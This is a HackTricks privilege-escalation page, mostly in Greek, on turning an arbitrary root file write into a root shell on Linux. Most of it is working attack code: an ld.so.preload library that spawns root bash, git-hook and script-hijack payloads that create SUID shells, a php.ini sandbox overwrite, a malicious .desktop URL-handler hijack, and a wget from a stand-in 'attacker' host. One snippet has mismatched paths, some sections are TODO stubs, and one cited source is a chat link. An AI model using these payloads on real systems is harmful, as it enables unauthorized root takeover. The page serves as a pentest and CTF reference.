# Αυθαίρετη εγγραφή αρχείου στο root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Αυτό το αρχείο συμπεριφέρεται όπως η μεταβλητή περιβάλλοντος **`LD_PRELOAD`**, αλλά λειτουργεί και σε **SUID binaries**.\
Εάν μπορείτε να το δημιουργήσετε ή να το τροποποιήσετε, μπορείτε απλά να προσθέσετε μια **διαδρομή προς μια βιβλιοθήκη που θα φορτωθεί** με κάθε εκτελούμενο binary.

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) είναι **σενάρια** που **εκτελούνται** σε διάφορα **γεγονότα** σε ένα git repository, όπως όταν δημιουργείται ένα commit, ένα merge... Οπότε αν ένα **privileged script or user** εκτελεί αυτές τις ενέργειες συχνά και είναι δυνατό να **γραφεί στον φάκελο `.git`**, αυτό μπορεί να χρησιμοποιηθεί για **privesc**.

Για παράδειγμα, είναι δυνατό να **δημιουργηθεί ένα script** σε ένα git repo στο **`.git/hooks`** ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### Επικαλύψτε ένα περιοριστικό `php.ini` που χρησιμοποιείται από ένα PHP sandbox με αυξημένα προνόμια

Κάποιοι custom daemons επαληθεύουν PHP που παρέχεται από τον χρήστη εκτελώντας `php` με ένα **περιοριστικό `php.ini`** (π.χ. `disable_functions=exec,system,...`). Αν ο sandboxed code εξακολουθεί να έχει **any write primitive** (όπως `file_put_contents`) και μπορείτε να φτάσετε στην **ακριβή διαδρομή `php.ini`** που χρησιμοποιεί ο daemon, μπορείτε να **επιγράψετε αυτό το config** για να άρετε τους περιορισμούς και στη συνέχεια να υποβάλετε ένα δεύτερο payload που θα τρέξει με αυξημένα προνόμια.

Τυπική ροή:

1. Το πρώτο payload επιγράφει το config του sandbox.
2. Το δεύτερο payload εκτελεί κώδικα τώρα που οι επικίνδυνες συναρτήσεις έχουν ενεργοποιηθεί ξανά.

Ελάχιστο παράδειγμα (αντικαταστήστε τη διαδρομή που χρησιμοποιεί ο daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

Το αρχείο που βρίσκεται στο `/proc/sys/fs/binfmt_misc` υποδεικνύει ποιο binary πρέπει να εκτελεί ποιον τύπο αρχείων. TODO: ελέγξτε τις προϋποθέσεις για να καταχραστείτε αυτό ώστε να εκτελεστεί ένα rev shell όταν ένας κοινός τύπος αρχείου είναι ανοιχτός.

### Overwrite schema handlers (like http: or https:)

Ένας επιτιθέμενος με δικαιώματα εγγραφής στους φακέλους ρυθμίσεων ενός θύματος μπορεί εύκολα να αντικαταστήσει ή να δημιουργήσει αρχεία που αλλάζουν τη συμπεριφορά του συστήματος, οδηγώντας σε απρόβλεπτη εκτέλεση κώδικα. Με την τροποποίηση του `$HOME/.config/mimeapps.list` ώστε να δείχνει τους HTTP και HTTPS URL handlers σε ένα κακόβουλο αρχείο (π.χ. ορίζοντας `x-scheme-handler/http=evil.desktop`), ο επιτιθέμενος διασφαλίζει ότι **κάθε κλικ σε σύνδεσμο http ή https ενεργοποιεί τον κώδικα που καθορίζεται σε εκείνο το `evil.desktop` αρχείο**. Για παράδειγμα, μετά την τοποθέτηση του ακόλουθου κακόβουλου κώδικα στο `evil.desktop` στο `$HOME/.local/share/applications`, κάθε κλικ σε εξωτερικό URL εκτελεί την ενσωματωμένη εντολή:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Για περισσότερες πληροφορίες δείτε [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) όπου χρησιμοποιήθηκε για την εκμετάλλευση μιας πραγματικής ευπάθειας.

### Root που εκτελεί user-writable scripts/binaries

Αν μια privileged workflow εκτελεί κάτι όπως `/bin/sh /home/username/.../script` (ή οποιοδήποτε binary μέσα σε έναν directory που ανήκει σε unprivileged user), μπορείς να το hijack:

- **Εντοπισμός εκτέλεσης:** παρακολούθησε διεργασίες με [pspy](https://github.com/DominicBreuker/pspy) για να εντοπίσεις περιπτώσεις όπου το root καλεί μονοπάτια ελεγχόμενα από χρήστη:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** βεβαιωθείτε ότι τόσο το αρχείο-στόχος όσο και ο κατάλογός του ανήκουν/είναι εγγράψιμα από τον χρήστη σας.
- **Hijack the target:** κάντε backup του original binary/script και drop ένα payload που δημιουργεί ένα SUID shell (ή οποιαδήποτε άλλη root action), στη συνέχεια επαναφέρετε τα permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Προκαλέστε την ενέργεια με προνόμια** (π.χ., πατώντας ένα UI κουμπί που εκκινεί το helper). Όταν ο root επανεκτελέσει την παραβιασμένη διαδρομή, αρπάξτε το αναβαθμισμένο shell με `./rootshell -p`.

## Αναφορές

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
